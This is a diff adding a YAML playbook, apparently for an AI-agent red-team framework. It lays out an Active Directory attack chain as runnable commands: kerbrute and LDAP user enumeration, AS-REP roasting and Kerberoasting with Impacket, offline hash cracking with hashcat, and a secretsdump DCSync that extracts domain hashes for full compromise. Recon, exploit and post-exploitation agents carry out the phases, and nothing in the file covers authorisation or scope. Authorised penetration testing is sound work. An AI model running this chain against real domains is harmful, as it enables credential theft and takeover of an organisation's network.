@@ -1,0 +1,61 @@
+name: Active Directory Assessment
+description: Kerberoast, AS-REP roast, and DCSync chain against an AD domain
+author:
+  name: Decepticon Team
+  github: PurpleAILAB
+version: 1.0.0
+tags: [ad, kerberos, windows, internal]
+
+variables:
+  domain:
+    type: string
+    required: true
+    description: AD domain (e.g. corp.local)
+  dc_ip:
+    type: string
+    required: true
+    description: Domain controller IP
+  user_list:
+    type: string
+    default: users.txt
+
+phases:
+  - name: enumeration
+    agents: [recon]
+    tools:
+      - name: ldapsearch
+        command: "ldapsearch -x -H ldap://${dc_ip} -b dc=${domain} '(objectClass=user)'"
+      - name: kerbrute
+        command: "kerbrute userenum -d ${domain} --dc ${dc_ip} ${user_list}"
+    post_analysis: |
+      Enumerate users, groups, SPNs, DCs, and trust relationships on
+      ${domain}. Build the target list for Kerberoasting / AS-REP roasting.
+
+  - name: asrep_roasting
+    agents: [exploit]
+    depends_on: [enumeration]
+    tools:
+      - name: impacket-GetNPUsers
+        command: "GetNPUsers.py ${domain}/ -dc-ip ${dc_ip} -usersfile ${user_list} -format hashcat -outputfile asrep.hash"
+    post_analysis: |
+      Harvest TGTs for accounts with DONT_REQUIRE_PREAUTH. Crack offline
+      with hashcat -m 18200.
+
+  - name: kerberoasting
+    agents: [exploit]
+    depends_on: [enumeration]
+    tools:
+      - name: impacket-GetUserSPNs
+        command: "GetUserSPNs.py ${domain}/USER:PASS -dc-ip ${dc_ip} -request -outputfile kerberoast.hash"
+    post_analysis: |
+      Extract TGS-REP tickets for SPNs. Crack offline with hashcat -m 13100.
+
+  - name: dcsync
+    agents: [postexploit]
+    depends_on: [kerberoasting, asrep_roasting]
+    tools:
+      - name: impacket-secretsdump
+        command: "secretsdump.py ${domain}/USER:PASS@${dc_ip} -just-dc-ntlm"
+    post_analysis: |
+      Once a DCSync-privileged account is compromised, extract NTDS.dit
+      hashes for full domain compromise.
